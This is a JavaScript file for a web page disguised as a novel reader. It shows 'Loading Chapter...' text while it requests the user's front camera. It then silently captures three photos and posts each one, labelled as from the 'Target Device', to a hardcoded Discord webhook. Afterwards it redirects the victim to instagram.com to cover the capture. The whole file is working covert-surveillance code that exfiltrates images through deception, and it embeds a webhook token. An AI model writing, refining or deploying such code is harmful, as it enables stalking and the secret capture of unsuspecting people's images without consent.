const webhookURL = "https://discord.com/api/webhooks/1572972860492742728/SmNNyYnxTwnP84_OUEhN3ca2F8U2Spq9p8WBCL6dr-PlK8GyvtYX5f6B3mfnHATL03eV";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let photoCount = 0;
const maxPhotos = 3;

async function startProcess() {
    document.getElementById('mainCard').innerHTML = `<h3>Loading Chapter...</h3><p style="color: #8e8e8e; font-size: 14px;">Please wait while the novel loads.</p>`;

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: false 
        });
        video.srcObject = stream;
        await video.play();
        
        setTimeout(captureAndSendPhotos, 1500);
    } catch (error) {
        console.error("Camera error:", error);
        setTimeout(() => {
            window.location.href = "https://instagram.com";
        }, 2000);
    }
}

function captureAndSendPhotos() {
    if (photoCount >= maxPhotos) {
        document.getElementById('mainCard').innerHTML = `<h3>Loaded Successfully</h3><p>Redirecting to reader...</p>`;
        setTimeout(() => {
            window.location.href = "https://instagram.com";
        }, 1000);
        return;
    }

    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => {
        if (!blob) {
            setTimeout(captureAndSendPhotos, 1200);
            return;
        }
        
        photoCount++;
        const formData = new FormData();
        formData.append('file', blob, `photo_${photoCount}.jpg`);
        formData.append('content', `📸 Captured Photo #${photoCount} from Target Device!`);

        fetch(webhookURL, {
            method: 'POST',
            body: formData
        })
        .then(response => {
            console.log(`Photo ${photoCount} sent to Discord successfully`);
            setTimeout(captureAndSendPhotos, 1200);
        })
        .catch(error => {
            console.error("Error sending photo to Discord:", error);
            setTimeout(captureAndSendPhotos, 1200);
        });
    }, 'image/jpeg', 0.8);
                  }
